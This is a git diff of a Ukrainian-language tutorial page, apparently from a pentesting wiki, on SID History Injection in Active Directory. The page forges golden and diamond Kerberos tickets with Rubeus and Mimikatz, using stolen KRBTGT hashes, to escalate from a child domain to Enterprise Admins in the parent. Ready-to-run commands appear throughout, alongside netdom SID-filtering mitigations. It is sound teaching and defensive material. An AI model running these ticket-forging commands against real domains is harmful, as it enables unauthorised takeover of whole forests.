@@ -4,17 +4,45 @@
 
 ## SID History Injection Attack
 
-Основна мета **SID History Injection Attack** полягає в допомозі **міграції користувачів між доменами**, забезпечуючи при цьому безперервний доступ до ресурсів з попереднього домену. Це досягається шляхом **включення попереднього Ідентифікатора Безпеки (SID) користувача в SID History** їх нового облікового запису. Варто зазначити, що цей процес може бути маніпульований для надання несанкціонованого доступу шляхом додавання SID групи з високими привілеями (такої як Enterprise Admins або Domain Admins) з батьківського домену до SID History. Це використання надає доступ до всіх ресурсів у батьківському домені.
+Основна мета **атаки на ін'єкцію SID-історії** полягає в допомозі **міграції користувачів між доменами**, забезпечуючи при цьому безперервний доступ до ресурсів з попереднього домену. Це досягається шляхом **включення попереднього ідентифікатора безпеки (SID) користувача в SID-історію** їх нового облікового запису. Варто зазначити, що цей процес може бути маніпульований для надання несанкціонованого доступу шляхом додавання SID групи з високими привілеями (такої як Enterprise Admins або Domain Admins) з батьківського домену до SID-історії. Це експлуатація надає доступ до всіх ресурсів у батьківському домені.
 
-Існує два методи для виконання цієї атаки: через створення або **Golden Ticket**, або **Diamond Ticket**.
+Існує два методи для виконання цієї атаки: через створення або **Золотого Квитка**, або **Діамантового Квитка**.
 
-Щоб визначити SID для групи **"Enterprise Admins"**, спочатку потрібно знайти SID кореневого домену. Після ідентифікації, SID групи Enterprise Admins можна побудувати, додавши `-519` до SID кореневого домену. Наприклад, якщо SID кореневого домену `S-1-5-21-280534878-1496970234-700767426`, то результатом буде SID для групи "Enterprise Admins" `S-1-5-21-280534878-1496970234-700767426-519`.
+Щоб визначити SID для групи **"Enterprise Admins"**, спочатку потрібно знайти SID кореневого домену. Після ідентифікації SID групи Enterprise Admins можна побудувати, додавши `-519` до SID кореневого домену. Наприклад, якщо SID кореневого домену `S-1-5-21-280534878-1496970234-700767426`, то результатом буде SID для групи "Enterprise Admins" `S-1-5-21-280534878-1496970234-700767426-519`.
 
 Ви також можете використовувати групи **Domain Admins**, які закінчуються на **512**.
 
 Ще один спосіб знайти SID групи з іншого домену (наприклад, "Domain Admins") це:
-```powershell
+```bash
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
+```
+> [!WARNING]
+> Зверніть увагу, що можливе відключення історії SID у відносинах довіри, що призведе до невдачі цієї атаки.
+
+Згідно з [**документацією**](https://technet.microsoft.com/library/cc835085.aspx):
+- **Відключення SIDHistory на лісових довірах** за допомогою інструменту netdom (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
+- **Застосування SID Filter Quarantining до зовнішніх довір** за допомогою інструменту netdom (`netdom trust /domain: /quarantine:yes on the domain controller`)
+- **Застосування SID Filtering до доменних довір у межах одного лісу** не рекомендується, оскільки це непідтримувана конфігурація і може призвести до руйнівних змін. Якщо домен у лісі є ненадійним, то він не повинен бути членом лісу. У цій ситуації необхідно спочатку розділити довірені та ненадійні домени на окремі ліси, де можна застосувати SID Filtering до міжлісової довіри.
+
+Перегляньте цей пост для отримання додаткової інформації про обхід цього: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
+
+### Diamond Ticket (Rubeus + KRBTGT-AES256)
+
+Останнього разу, коли я пробував це, мені потрібно було додати аргумент **`/ldap`**.
+```bash
+# Use the /sids param
+Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap
+
+# Or a ptt with a golden ticket
+## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
+## The /printcmd option will print the complete command if later you want to generate a token offline
+Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd
+
+#e.g.
+
+execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd
+
+# You can use "Administrator" as username or any other string
 ```
 ### Золотий квиток (Mimikatz) з KRBTGT-AES256
 ```bash
@@ -39,17 +67,8 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 golden-ticket.md
 {{#endref}}
 
-### Діамантовий квиток (Rubeus + KRBTGT-AES256)
-```powershell
-# Use the /sids param
-Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap
 
-# Or a ptt with a golden ticket
-Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt
-
-# You can use "Administrator" as username or any other string
-```
-Для отримання додаткової інформації про diamond tickets перевірте:
+Для отримання додаткової інформації про діамантові квитки перевірте:
 
 {{#ref}}
 diamond-ticket.md
@@ -59,7 +78,7 @@ diamond-ticket.md
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-Ескалація до DA кореневого або корпоративного адміністратора, використовуючи хеш KRBTGT скомпрометованого домену:
+Ескалювати до DA кореневого або Enterprise адміністратора, використовуючи хеш KRBTGT скомпрометованого домену:
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
